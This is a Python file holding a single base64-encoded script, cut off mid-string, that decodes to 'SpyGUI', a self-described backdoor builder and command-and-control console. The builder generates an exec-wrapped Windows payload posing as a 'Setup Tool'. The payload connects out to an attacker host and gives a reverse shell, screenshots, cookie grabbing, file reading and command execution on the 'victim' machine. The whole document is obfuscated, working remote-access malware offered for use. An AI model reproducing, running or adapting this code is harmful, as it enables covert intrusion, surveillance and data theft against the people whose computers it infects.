import os
import base64

script = "cHJpbnQoIlsrXSBTdGFydCBDaGVja2luZyBNb2R1bGUuLi4iKQ0KaW1wb3J0IG9zDQp0cnk6ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGltcG9ydCByYW5kb20NCiAgICBpbXBvcnQgcHlmaWdsZXQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnJvbSBweWZpZ2xldCBpbXBvcnQgRmlnbGV0DQogICAgaW1wb3J0IGNvbG9yYW1hICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUNCiAgICBmcm9tIGNvbG9yYW1hIGltcG9ydCBTdHlsZQ0KICAgIGltcG9ydCBzb2NrZXQNCiAgICBpbXBvcnQgb3MNCiAgICBpbXBvcnQgYmFzZTY0DQogICAgY29sb3JhbWEuaW5pdCgpDQoNCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICBwcmludChmIkVycm9yIDoge2V9IikNCiAgICBvcy5zeXN0ZW0oJ3BpcDMgaW5zdGFsbCBweWZpZ2xldCcpDQogICAgb3Muc3lzdGVtKCdwaXAzIGluc3RhbGwgY29sb3JhbWEnKQ0KDQp5ZWxsb3cgPSBGb3JlLllFTExPVw0KZ3JlZW4gPSBGb3JlLkdSRUVODQpyZWQgPSBGb3JlLlJFRA0KYmx1ZSA9IEZvcmUuQkxVRQ0KcmVzZXQgPSBTdHlsZS5SRVNFVF9BTEwNCg0KbGhvc3QgPSAiMTI3LjAuMC4xIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxwb3J0ID0gNDQ0NA0Kcmhvc3QgPSAiMC4wLjAuMCIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJwb3J0ID0gNDQ0NA0KZmlsZV9uYW1lID0gImRlZmF1bHRfZmlsZSINCg0KYnl0ZXMgPSByYW5kb20ucmFuZGludCgxMDAwMCwgMjAwMDApDQoNCmZvbnRzID0gRmlnbGV0KGZvbnQ9J3NsYW50JykNCnByaW50KGJsdWUgKyBmb250cy5yZW5kZXJUZXh0KCdTcHlHVUknKSArIHJlc2V0KQ0KcHJpbnQoZiIiIg0KQ29weXJpZ2h0IDoge3llbGxvd31QaGFtQ2hpZW57cmVzZXR9DQpUZWxlZ3JhbSA6IHt5ZWxsb3d9QGFub255bW91c19zZWN1cmVze3Jlc2V0fQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIERlc2NyaXB0aW9uIDoNClNweUdVSSBpcyBhIFB5dGhvbi1iYXNlZCBiYWNrZG9vciB0b29sIHdpdGggYSBmaWxlIGZvcm1hdCBpbiBQeXRob24sIGRlc2lnbmVkIGZvciBjb3ZlcnQgc3lzdGVtIGluZmlsdHJhdGlvbi4NCg0KTm90ZSA6DQpPbmNlIGNyZWF0ZWQsIHRoZSBtYWxpY2lvdXMgY29kZSBmaWxlIGNhbiBvbmx5IGJlIGFwcGxpZWQgdG8gY29tcHV0ZXJzIG9yIHdpbmRvd3MNCg0KQ29tbWFuZCAgICAgICAgIERlc2NyaXB0aW9uDQotLS0tLS0tLSAgICAgICAtLS0tLS0tLS0tLS0tICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhlbHAgICAgICAgICAgIEhlbHBpbmcgVG9vbA0KIiIiKQ0Kd2hpbGUgVHJ1ZToNCiAgICBjMl9pbnB1dCA9IGlucHV0KGYie3JlZH1zcHlndWl7cmVzZXR9ID4gIikNCiAgICBpZiBjMl9pbnB1dCA9PSAibHBvcnQiIG9yIGMyX2lucHV0ID09ICJscG9ydCAiOg0KICAgICAgICBscG9ydCA9IGludChpbnB1dCgiU2V0IExQT1JUID4gIikpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBTZXQgTFBPUlQge2xwb3J0fSBzdWNjZXNzIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgYzJfaW5wdXQgPT0gInJwb3J0IiBvciBjMl9pbnB1dCA9PSAicnBvcnQgIjoNCiAgICAgICAgcnBvcnQgPSBpbnQoaW5wdXQoIlNldCBSUE9SVCA+ICIpKQ0KICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IFNldCBSUE9SVCB7cnBvcnR9IHN1Y2Nlc3MiKQ0KDQogICAgaWYgYzJfaW5wdXQgPT0gInJob3N0IiBvciBjMl9pbnB1dCA9PSAicmhvc3QgIjoNCiAgICAgICAgcmhvc3QgPSBpbnB1dCgiU2V0IFJIT1NUID4gIikNCiAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBTZXQgUkhPU1Qge3Job3N0fSBzdWNjZXNzIikNCg0KICAgIGlmIGMyX2lucHV0ID09ICJsaG9zdCIgb3IgYzJfaW5wdXQgPT0gImxob3N0ICI6DQogICAgICAgIGxob3N0ID0gaW5wdXQoIlNldCBMSE9TVCA+ICIpDQogICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gU2V0IExIT1NUIHtsaG9zdH0gc3VjY2VzcyIpDQoNCiAgICBpZiBjMl9pbnB1dCA9PSAiYnVpbGQiIG9yIGMyX2lucHV0ID09ICJidWlsZCAiOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBpZiBub3QgbGhvc3Q6DQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7cmVkfVstXXtyZXNldH0gUGxlYXNlIFNldCBMSE9TVCBjb21tYW5kICdsaG9zdCcuLi4iKQ0KICAgICAgICAgICAgZWxpZiBub3QgbHBvcnQ6DQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7cmVkfVstXXtyZXNldH0gUGxlYXNlIFNldCBMUE9SVCwgY29tbWFuZCAnbHBvcnQnLi4uIikNCg0KICAgICAgICAgICAgaWYgbm90IHJob3N0Og0KICAgICAgICAgICAgICAgIHByaW50KGYie3JlZH1bLV17cmVzZXR9IFBsZWFzZSBTZXQgUkhPU1QsIGNvbW1hbmQgJ3Job3N0Jy4uLiIpDQogICAgICAgICAgICBlbGlmIG5vdCBycG9ydDoNCiAgICAgICAgICAgICAgICBwcmludChmIntyZWR9Wy1de3Jlc2V0fSBQbGVhc2UgU2V0IFJQT1JULCBjb21tYW5kICdycG9ydCcuLi4iKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBmaWxlX25hbWUgPSBpbnB1dCgiU2V0IEZpbGUgTmFtZSA+ICIpDQogICAgICAgICAgICBwYXlsb2FkID0gciIiIg0KaW1wb3J0IG9zDQp0cnk6DQogICAgaW1wb3J0IG1zcw0KICAgIGltcG9ydCBzeXMNCiAgICBpbXBvcnQgc29ja2V0DQogICAgaW1wb3J0IHN1YnByb2Nlc3MNCiAgICBpbXBvcnQgb3MNCiAgICBpbXBvcnQgcHlmaWdsZXQNCiAgICBpbXBvcnQgcGxhdGZvcm0NCiAgICBpbXBvcnQganNvbg0KICAgIGZyb20gcHlmaWdsZXQgaW1wb3J0IEZpZ2xldA0KZXhjZXB0Og0KICAgIGltcG9ydCBvcw0KICAgIG9zLnN5c3RlbSgncGlwMyBpbnN0YWxsIG1zcycpDQogICAgb3Muc3lzdGVtKCdwaXAzIGluc3RhbGwgcHlmaWdsZXQnKQ0KDQppZiBvcy5uYW1lID09ICJudCI6DQogICAgcGFzcw0KZWxzZToNCiAgICBwcmludCgiWyFdIEFsbCBMaW51eCBvcGVyYXRpbmcgc3lzdGVtcyBjYW5ub3QgdXNlIHRoaXMgZmlsZSIpDQogICAgcHJpbnQoIlshXSBwbGVhc2UgcnVuIGl0IHVzaW5nIGEgY29tcHV0ZXIsIG9yIHdpbmRvd3MiKQ0KICAgIGV4aXQoIlshXSBEZW5pZWQgc3VwcG9ydCB3aXRoIExpbnV4IG9wZXJhdGluZyBzeXN0ZW0iKQ0KDQpmb250cyA9IEZpZ2xldChmb250PSdzbGFudCcpDQpwcmludChmb250cy5yZW5kZXJUZXh0KCdTdGFydGluZyBTZXR1cCBUb29sJykpDQpwcmludCgiWytdIFN0YXJ0aW5nIFNldHVwLi4uIikNCnByaW50KCJXYWl0aW5nIDEwLTE1IG1pbi4uLiIpDQoNCmhvc3QgPSAie3Job3N0fSINCnBvcnQgPSB7cnBvcnR9DQp0cnk6DQogICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgc2V0dGluZ3NfY29ubmVjdCA9IHNvY2tldC5zb2NrZXQoDQogICAgICAgICAgICBzb2NrZXQuQUZfSU5FVCwNCiAgICAgICAgICAgIHNvY2tldC5TT0NLX1NUUkVBTQ0KICAgICAgICApDQogICAgICAgIHNldHRpbmdzX2Nvbm5lY3QuY29ubmVjdCgoaG9zdCwgcG9ydCkpDQogICAgICAgIHMgPSBzZXR0aW5nc19jb25uZWN0DQogICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICBvdXRwdXQgPSBzLnJlY3YoOTAyNCkNCiAgICAgICAgICAgIG91dHB1dF9kZSA9IG91dHB1dC5kZWNvZGUoKQ0KICAgICAgICAgICAgaWYgInN5c2luZm8iIGluIG91dHB1dF9kZToNCiAgICAgICAgICAgICAgICBkYXRhID0gc3RyKHBsYXRmb3JtLnVuYW1lKCkpDQogICAgICAgICAgICAgICAgcy5zZW5kYWxsKGRhdGEuZW5jb2RlKCkpDQoNCiAgICAgICAgICAgIGlmICJzaGVsbCIgaW4gb3V0cHV0X2RlOg0KICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICAgICAgICAgIG9wX2RlID0gcy5yZWN2KDkwMjQpLmRlY29kZSgpDQoNCiAgICAgICAgICAgICAgICAgICAgaWYgImV4aXQiIGluIG9wX2RlOg0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsNCg0KICAgICAgICAgICAgICAgICAgICBvdXRwdXRfc2hlbGwgPSBzdWJwcm9jZXNzLlBvcGVuKA0KICAgICAgICAgICAgICAgICAgICAgICAgb3BfZGUsDQogICAgICAgICAgICAgICAgICAgICAgICBzaGVsbD1UcnVlLA0KICAgICAgICAgICAgICAgICAgICAgICAgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSwNCiAgICAgICAgICAgICAgICAgICAgICAgIHN0ZGluPXN1YnByb2Nlc3MuUElQRSwNCiAgICAgICAgICAgICAgICAgICAgICAgIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUNCiAgICAgICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgICAgICB3b3JrID0gb3V0cHV0X3NoZWxsLnN0ZG91dC5yZWFkICsgb3V0cHV0X3NoZWxsLnN0ZGVyci5yZWFkKCkNCiAgICAgICAgICAgICAgICAgICAgcy5zZW5kYWxsKHdvcmsuZW5jb2RlKCkpDQoNCiAgICAgICAgICAgIGlmICJtZXNzZW5nZSIgaW4gb3V0cHV0X2RlOg0KICAgICAgICAgICAgICAgIGxpc3Rlbl9tZXNzID0gcy5yZWN2KDkwMjQpDQogICAgICAgICAgICAgICAgYnl0ZV9kZWNvZGUgPSBsaXN0ZW5fbWVzcy5kZWNvZGUoKQ0KICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgiZWNobyA+IHNldHVwLnZicyIpDQogICAgICAgICAgICAgICAgd2l0aCBvcGVuKCdzZXR1cC52YnMnLCAndycpIGFzIHNhdmU6DQogICAgICAgICAgICAgICAgICAgIGRhdGEgPSAnbXNnYm94KCInICsgYnl0ZV9kZWNvZGUgKyAnIiknICsgIlxuIiArICdtc2dib3goIicgKyBieXRlX2RlY29kZSArICciKScNCiAgICAgICAgICAgICAgICAgICAgc2F2ZS53cml0ZShkYXRhKQ0KICAgICAgICAgICAgICAgIGZvciBvcGVuX3RhYl9tZXNzIGluIHJhbmdlKDEwKToNCiAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKCJzZXR1cC52YnMiKQ0KICAgICAgICAgICAgICAgIG9zLnJlbW92ZSgic2V0dXAudmJzIikNCg0KICAgICAgICAgICAgaWYgInNjcmVlbnNob3QiIGluIG91dHB1dF9kZToNCiAgICAgICAgICAgICAgICB3aXRoIG1zcy5tc3MoKSBhcyBzY3JlZW5zaG90Og0KICAgICAgICAgICAgICAgICAgICBzY3JlZW5zaG90LnNob3Qob3V0cHV0PSdkZWZhdWx0LnBuZycpDQogICAgICAgICAgICAgICAgd2l0aCBvcGVuKCdkZWZhdWx0LnBuZycsICdyYicpIGFzIG5vdGlfZmlsZToNCiAgICAgICAgICAgICAgICAgICAgZGF0YSA9IG5vdGlfZmlsZS5yZWFkKCkNCiAgICAgICAgICAgICAgICBzLnNlbmRhbGwoZGF0YSkNCiAgICAgICAgICAgICAgICBvcy5yZW1vdmUoImRlZmF1bHQucG5nIikNCg0KICAgICAgICAgICAgaWYgImRpciIgaW4gb3V0cHV0X2RlOg0KICAgICAgICAgICAgICAgIHBhdGggPSBzLnJlY3YoMTAyNCkuZGVjb2RlKCkNCiAgICAgICAgICAgICAgICBjbWQgPSAiZGlyIiwgcGF0aA0KICAgICAgICAgICAgICAgIHNoZWxsX3N0YXJ0ID0gc3VicHJvY2Vzcy5Qb3BlbigNCiAgICAgICAgICAgICAgICAgICAgY21kLA0KICAgICAgICAgICAgICAgICAgICBzaGVsbD1UcnVlLA0KICAgICAgICAgICAgICAgICAgICBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLA0KICAgICAgICAgICAgICAgICAgICBzdGRpbj1zdWJwcm9jZXNzLlBJUEUsDQogICAgICAgICAgICAgICAgICAgIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUNCiAgICAgICAgICAgICAgICApDQogICAgICAgICAgICAgICAgZGF0YSA9IHNoZWxsX3N0YXJ0LnN0ZG91dC5yZWFkKCkgKyBzaGVsbF9zdGFydC5zdGRlcnIucmVhZCgpDQogICAgICAgICAgICAgICAgcy5zZW5kKGRhdGEpDQoNCiAgICAgICAgICAgIGlmICJ1cGxvYWQiIGluIG91dHB1dF9kZToNCiAgICAgICAgICAgICAgICByZWFkX2ZpbGUgPSBzLnJlY3YoMTAwMDI0KQ0KICAgICAgICAgICAgICAgIGZvcm1hdHMgPSBzLnJlY3YoMTAyNCkuZGVjb2RlKCkNCiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oInVwbG9hZF8xMjMuaHRtbCIsICd3YicpIGFzIHNhdmU6DQogICAgICAgICAgICAgICAgICAgIHNhdmUud3JpdGUocmVhZF9maWxlKQ0KDQogICAgICAgICAgICBpZiAib3BlbiIgaW4gb3V0cHV0X2RlOg0KICAgICAgICAgICAgICAgIGZpbGUgPSBzLnJlY3YoMjAyNCkNCiAgICAgICAgICAgICAgICBmaWxlID0gc3RyKGZpbGUuZGVjb2RlKCkpDQogICAgICAgICAgICAgICAgb3Muc3lzdGVtKGZpbGUpDQoNCiAgICAgICAgICAgIGlmICJnZXQgY29va2llIiBpbiBvdXRwdXRfZGU6DQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICB1cmwgPSBzLnJlY3YoMjAyNCkuZGVjb2RlKCkNCiAgICAgICAgICAgICAgICAgICAgaW1wb3J0IHJlcXVlc3RzDQogICAgICAgICAgICAgICAgICAgIGRlZiBnZXQoKToNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHVybCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvb2tpZSA9IHJlc3BvbnNlLmNvb2tpZXMuZ2V0X2RpY3QoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgY29vayA9IGNvb2tpZQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgY29vazoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBqc29uX2Nvb2tpZSA9IGpzb24uZHVtcHMoY29vaykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzLnNlbmQoanNvbl9jb29raWUuZW5jb2RlKCkpDQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHMuc2VuZChiIlsrXSBGYWlsZWQgR2V0IENvb2tpZSIpDQogICAgICAgICAgICAgICAgICAgIGdldCgpDQogICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICBwYXNzDQoNCiAgICAgICAgICAgIGlmICJwd2QiIGluIG91dHB1dF9kZToNCiAgICAgICAgICAgICAgICBwYXRoID0gImNkIg0KICAgICAgICAgICAgICAgIHNoZWxsX3N0YXJ0ID0gc3VicHJvY2Vzcy5Qb3BlbigNCiAgICAgICAgICAgICAgICAgICAgcGF0aCwNCiAgICAgICAgICAgICAgICAgICAgc2hlbGw9VHJ1ZSwNCiAgICAgICAgICAgICAgICAgICAgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwNCiAgICAgICAgICAgICAgICAgICAgc3RkaW49c3VicHJvY2Vzcy5QSVBFLA0KICAgICAgICAgICAgICAgICAgICBzdGRlcnI9c3VicHJvY2Vzcy5QSVBFDQogICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgIHAgPSBzaGVsbF9zdGFydC5zdGRvdXQucmVhZCgpICsgc2hlbGxfc3RhcnQuc3RkZXJyLnJlYWQoKQ0KICAgICAgICAgICAgICAgIHMuc2VuZGFsbChwKQ0KDQogICAgICAgICAgICBpZiAicmVhZCBmaWxlIiBpbiBvdXRwdXRfZGU6DQogICAgICAgICAgICAgICAgcGF0aCA9IHMucmVjdig5MDI0KQ0KICAgICAgICAgICAgICAgIHJlYWQgPSAidHlwZSIsIHBhdGgNCiAgICAgICAgICAgICAgICBzaGVsbF9zdGFydCA9IHN1YnByb2Nlc3MuUG9wZW4oDQogICAgICAgICAgICAgICAgICAgIHJlYWQsDQogICAgICAgICAgICAgICAgICAgIHNoZWxsPVRydWUsDQogICAgICAgICAgICAgICAgICAgIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsDQogICAgICAgICAgICAgICAgICAgIHN0ZGluPXN1YnByb2Nlc3MuUElQRSwNCiAgICAgICAgICAgICAgICAgICAgc3RkZXJyPXN1YnByb2Nlc3MuUElQRQ0KICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICAgICBwID0gc2hlbGxfc3RhcnQuc3Rkb3V0LnJlYWQoKSArIHNoZWxsX3N0YXJ0LnN0ZGVyci5yZWFkKCkNCiAgICAgICAgICAgICAgICBzLnNlbmRhbGwocCkNCg0KICAgICAgICAgICAgaWYgImV4aXQiIGluIG91dHB1dF9kZToNCiAgICAgICAgICAgICAgICBmaWxlX25hbWUgPSBzLnJlY3YoMjAyNCkuZGVjb2RlKCkNCiAgICAgICAgICAgICAgICBmaWxlID0gZmlsZV9uYW1lICsgIi5weSINCiAgICAgICAgICAgICAgICBvcy5yZW1vdmUoZmlsZSkNCg0KICAgICAgICAgICAgaWYgInJvdXRlIiBpbiBvdXRwdXRfZGU6DQogICAgICAgICAgICAgICAgcmVhZCA9IHIiQzpcV2luZG93c1xTeXN0ZW0zMlxuZXRzdGF0LmV4ZSINCiAgICAgICAgICAgICAgICBzaGVsbF9zdGFydCA9IHN1YnByb2Nlc3MuUG9wZW4oDQogICAgICAgICAgICAgICAgICAgIHJlYWQsDQogICAgICAgICAgICAgICAgICAgIHNoZWxsPVRydWUsDQogICAgICAgICAgICAgICAgICAgIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsDQogICAgICAgICAgICAgICAgICAgIHN0ZGluPXN1YnByb2Nlc3MuUElQRSwNCiAgICAgICAgICAgICAgICAgICAgc3RkZXJyPXN1YnByb2Nlc3MuUElQRQ0KICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICAgICBwID0gc2hlbGxfc3RhcnQuc3Rkb3V0LnJlYWQoKSArIHNoZWxsX3N0YXJ0LnN0ZGVyci5yZWFkKCkNCiAgICAgICAgICAgICAgICBzLnNlbmRhbGwocCkNCg0KICAgICAgICAgICAgaWYgImlwY29uZmlnIiBpbiBvdXRwdXRfZGU6DQogICAgICAgICAgICAgICAgcmVhZCA9IHIiQzpcV2luZG93c1xTeXN0ZW0zMlxpcGNvbmZpZy5leGUiDQogICAgICAgICAgICAgICAgc2hlbGxfc3RhcnQgPSBzdWJwcm9jZXNzLlBvcGVuKA0KICAgICAgICAgICAgICAgICAgICByZWFkLA0KICAgICAgICAgICAgICAgICAgICBzaGVsbD1UcnVlLA0KICAgICAgICAgICAgICAgICAgICBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLA0KICAgICAgICAgICAgICAgICAgICBzdGRpbj1zdWJwcm9jZXNzLlBJUEUsDQogICAgICAgICAgICAgICAgICAgIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUNCiAgICAgICAgICAgICAgICApDQogICAgICAgICAgICAgICAgcCA9IHNoZWxsX3N0YXJ0LnN0ZG91dC5yZWFkKCkgKyBzaGVsbF9zdGFydC5zdGRlcnIucmVhZCgpDQogICAgICAgICAgICAgICAgcy5zZW5kYWxsKHApDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIHBhc3MNCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICBwcmludChlKQ0KICAgIGV4aXQoIlsrXSBTZXR1cCBFcnJvciIpDQoiIiIuZm9ybWF0KHJob3N0PXJob3N0LCBycG9ydD1ycG9ydCkNCiAgICAgICAgICAgIGVuY29kZXMgPSBiYXNlNjQuYjY0ZW5jb2RlKHBheWxvYWQuZW5jb2RlKCkpDQogICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IFN0YXJ0IEVuY29kZSBGaWxlLi4uIikNCiAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gU3RhcnQgUmFuZG9tIE11dGV4Li4iKQ0KICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBTdGFydCBCdWlsZGluZyBTb2NrZXQuLi4iKQ0KICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBTdGFydCBCdWlsZGluZyBKc29uLi4uIikNCiAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gU3RhcnQgQnVpbGRpbmcgSGFuZGxlciBTZXJ2ZXIuLi4iKQ0KICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBNb2R1bGUgSXMgT0siKQ0KICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBQYXlsb2FkIDoge3JlZH1cbntlbmNvZGVzfXtyZXNldH0iKQ0KICAgICAgICAgICAgcGF5bG9hZHMgPSBmIiIiDQppbXBvcnQgYmFzZTY0DQoNCnNjcmlwdF9kZSA9IGJhc2U2NC5iNjRkZWNvZGUoe2VuY29kZXN9KS5kZWNvZGUoKQ0KZXhlYyhzY3JpcHRfZGUpDQoiIiINCiAgICAgICAgICAgIG9zLnN5c3RlbShmJ2VjaG8gPiAuL2J1aWxkL3tmaWxlX25hbWV9LnB5JykNCiAgICAgICAgICAgIG11dGV4ID0gcmFuZG9tLnJhbmRpbnQoMTAwLCA5OTkpDQogICAgICAgICAgICBtdXRleCA9IG9zLnN5c3RlbShmImVjaG8ge211dGV4fSB8IG1kNXN1bSIpDQogICAgICAgICAgICB3aXRoIG9wZW4oZiIuL2J1aWxkL3tmaWxlX25hbWV9LnB5IiwgJ3cnKSBhcyBidWlsZHM6DQogICAgICAgICAgICAgICAgYnl0ZXMgPSBidWlsZHMud3JpdGUocGF5bG9hZHMpDQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBNdXRleCBSYW5kb20gOiB7Z3JlZW59e211dGV4fXtyZXNldH0iKQ0KICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gRmlsZSBOYW1lIDoge2ZpbGVfbmFtZX0ucHkiKQ0KICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gQnl0ZXMgOiB7Ynl0ZXN9IikNCiAgICAgICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IEZpbGUgU2F2ZWQgVG8gOiAuL2J1aWxkL3tmaWxlX25hbWV9LnB5Ii5mb3JtYXQoZmlsZV9uYW1lPWZpbGVfbmFtZSkpDQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgIHByaW50KGYie3JlZH1bLV17cmVzZXR9IEZhaWxlZCA6IiwgZSkNCg0KICAgIGlmIGMyX2lucHV0ID09ICJleHBsb2l0IiBvciBjMl9pbnB1dCA9PSAiZXhwbG9pdCAiIG9yIGMyX2lucHV0ID09ICJydW4iIG9yIGMyX2lucHV0ID09ICJydW4gIjoNCiAgICAgICAgaWYgbm90IGZpbGVfbmFtZToNCiAgICAgICAgICAgIHByaW50KCJQbGVhc2UgU0VUIEZJTEVfTkFNRS4uLiIpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBzID0gc29ja2V0LnNvY2tldCgNCiAgICAgICAgICAgICAgICBzb2NrZXQuQUZfSU5FVCwNCiAgICAgICAgICAgICAgICBzb2NrZXQuU09DS19TVFJFQU0NCiAgICAgICAgICAgICkNCiAgICAgICAgICAgIHMuc2V0c29ja29wdCgNCiAgICAgICAgICAgICAgICBzb2NrZXQuU09MX1NPQ0tFVCwNCiAgICAgICAgICAgICAgICBzb2NrZXQuU09fUkVVU0VBRERSLA0KICAgICAgICAgICAgICAgIDENCiAgICAgICAgICAgICkNCiAgICAgICAgICAgIHMuYmluZCgobGhvc3QsIGxwb3J0KSkNCiAgICAgICAgICAgIHMubGlzdGVuKDEpDQogICAgICAgICAgICBwcmludCgiIikNCiAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gU3RhcnRpbmcgU2VydmVyIE9uIFBvcnQiLCBscG9ydCkNCiAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gTGlzdGVuIFJlbW90ZSBIb3N0Iiwgcmhvc3QpDQogICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IFRpcCwgWW91IGNhbiB1c2UgTmdyb2sgdG8gYnVmZmVyIGFuZCBwdWJsaWNpemUgeW91ciBTZXJ2ZXIgQWRkcmVzcyIpDQogICAgICAgICAgICBjb25uLCBhZGRyID0gcy5hY2NlcHQoKQ0KICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSB7YWRkclswXX06e2FkZHJbMV19IC0tPiB7bGhvc3R9OntscG9ydH0ge2J5dGVzfSBCeXRlcyIpDQogICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IFN0YXJ0aW5nIFJldmVyc2UgU2hlbGwge2FkZHJbMF19OnthZGRyWzFdfSAtLT4ge2xob3N0fTp7bHBvcnR9IHtieXRlc30gQnl0ZXMiKQ0KICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBDb21tYW5kICdoZWxwJyBmb3IgaGVscGluZyByZXZlcnNlIHNoZWxsIikNCiAgICAgICAgICAgIHByaW50KCIiKQ0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICAgICAgICAgIHNoZWxsX2NvbW1hbmQgPSBpbnB1dChmInthZGRyWzBdfTp7YWRkclsxXX1AU3B5R1VJID4+PiAiKQ0KICAgICAgICAgICAgICAgICAgICBpZiBzaGVsbF9jb21tYW5kID09ICJoZWxwIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCIiIg0KQ29tbWFuZCAgICAgICAgIERlc2NyaXB0aW9uDQotLS0tLS0tLSAgICAgICAgLS0tLS0tLS0tLS0tDQogIGhlbHAgICAgICAgICAgIGhlbHBpbmcgcmV2ZXJzZQ0KICBzY3JlZW5zaG90ICAgICBzY3JlZW5zaG90IHZpY3RpbQ0KICBzaGVsbCAgICAgICAgICBzdGFydCBjb21tYW5kIHByb21wdA0KICBtZXNzZW5nZSAgICAgICBzaG93IG1lc3NlbmdlIHRvIHZpY3RpbQ0KICBzeXNpbmZvICAgICAgICBzaG93IGluZm9ybWF0aW9uIGNvbXB1dGVyDQogIHJvdXRlICAgICAgICAgIHNob3cgcm91dGUgYWRkcmVzcw0KICBpcGNvbmZpZyAgICAgICBTaG93IElQIENvbmZpZw0KICBleGl0ICAgICAgICAgICBleGl0IHJldmVyc2UNCg0KU2hlbGwgQ29tbWFuZA0KLS0tLS0tLS0tLS0tLS0NCiAgZGlyICAgICAgICAgICAgc